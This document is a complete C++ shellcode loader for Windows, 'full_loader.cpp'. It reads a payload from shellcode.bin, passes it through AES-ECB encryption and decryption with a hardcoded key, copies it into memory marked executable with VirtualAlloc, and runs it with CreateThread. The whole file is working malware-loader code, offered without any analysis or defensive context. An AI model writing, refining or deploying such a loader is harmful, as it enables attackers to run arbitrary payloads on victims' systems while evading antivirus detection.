// full_loader.cpp

#include <iostream>
#include <fstream>
#include <vector>
#include <iomanip>
#include <windows.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>

using namespace CryptoPP;

std::vector<uint8_t> pad(const std::vector<uint8_t>& input) {
    std::vector<uint8_t> padded = input;
    uint8_t pad_len = 16 - (padded.size() % 16);
    for (int i = 0; i < pad_len; ++i)
        padded.push_back(pad_len);
    return padded;
}

std::vector<uint8_t> aes_encrypt(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
    ECB_Mode<AES>::Encryption encryptor;
    encryptor.SetKey(key.data(), key.size());

    std::vector<uint8_t> padded = pad(data);

    std::string encrypted;
    StringSource ss(
        padded.data(), padded.size(), true,
        new StreamTransformationFilter(encryptor, new StringSink(encrypted))
    );

    return std::vector<uint8_t>(encrypted.begin(), encrypted.end());
}

std::vector<uint8_t> aes_decrypt(const std::vector<uint8_t>& encrypted, const std::vector<uint8_t>& key) {
    ECB_Mode<AES>::Decryption decryptor;
    decryptor.SetKey(key.data(), key.size());

    std::string decrypted;
    StringSource ss(
        encrypted.data(), encrypted.size(), true,
        new StreamTransformationFilter(decryptor, new StringSink(decrypted))
    );

    uint8_t pad_len = decrypted.back();
    decrypted.resize(decrypted.size() - pad_len);

    return std::vector<uint8_t>(decrypted.begin(), decrypted.end());
}

void execute_shellcode(const std::vector<uint8_t>& shellcode) {
    LPVOID mem = VirtualAlloc(nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode.data(), shellcode.size());
    HANDLE thread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
    WaitForSingleObject(thread, INFINITE);
}

int main() {
    try {
        // 1. Read shellcode.bin
        std::ifstream file("shellcode.bin", std::ios::binary);
        if (!file) {
            throw std::runtime_error("Cannot open shellcode.bin");
        }
        std::vector<uint8_t> raw_shellcode((std::istreambuf_iterator<char>(file)), {});

        // 2. Static AES key (can randomize later)
        std::vector<uint8_t> key = {
            0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80,
            0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 0x00
        };

        // 3. Encrypt shellcode in memory
        std::vector<uint8_t> encrypted_shellcode = aes_encrypt(raw_shellcode, key);

        std::cout << "[+] Shellcode encrypted in memory.\n";

        // 4. Decrypt immediately
        std::vector<uint8_t> decrypted_shellcode = aes_decrypt(encrypted_shellcode, key);

        std::cout << "[+] Shellcode decrypted, executing now...\n";

        // 5. Execute shellcode
        execute_shellcode(decrypted_shellcode);
    }
    catch (const std::exception& e) {
        std::cerr << "[!] Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
